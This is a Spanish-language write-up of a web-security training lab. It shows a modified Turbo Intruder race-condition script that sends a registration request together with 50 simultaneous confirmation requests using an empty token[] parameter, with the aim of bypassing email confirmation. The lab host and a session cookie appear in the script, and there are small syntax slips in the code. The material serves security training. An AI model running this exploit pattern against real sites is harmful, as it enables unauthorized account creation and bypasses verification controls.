En esta clase utilizamos Turbo Intruder para lanzar una ráfaga de registros junto con múltiples confirmaciones simultáneas. El ataque está diseñado para saturar la ventana de carrera antes de que el token se haya escrito, enviando confirmaciones con un **token[]** vacío.

Para lograrlo, usamos una plantilla adaptada que coordina el envío sincronizado de las peticiones de registro y confirmación mediante “**gates**“. Esta ejecución masiva aumenta significativamente la probabilidad de éxito del ataque.

La clase se centra en cómo diseñar, personalizar y lanzar correctamente este ataque desde Turbo Intruder.

Solucion
dentro del turbo intruder seleccionamos el race-single-packet-attack
y lo modificamos

(def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    confirmation_email =  '''POST /confirm?token[]= HTTP/2
Host: 0ade005a033104308015582a00e700ce.web-security-academy.net
Cookie: phpsessionid=RxwYlBG5FYgFJmUUJwzvxA29D7mv7opF
Content-Length: 0

'''
    
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'Marik' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmation_email, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req))
    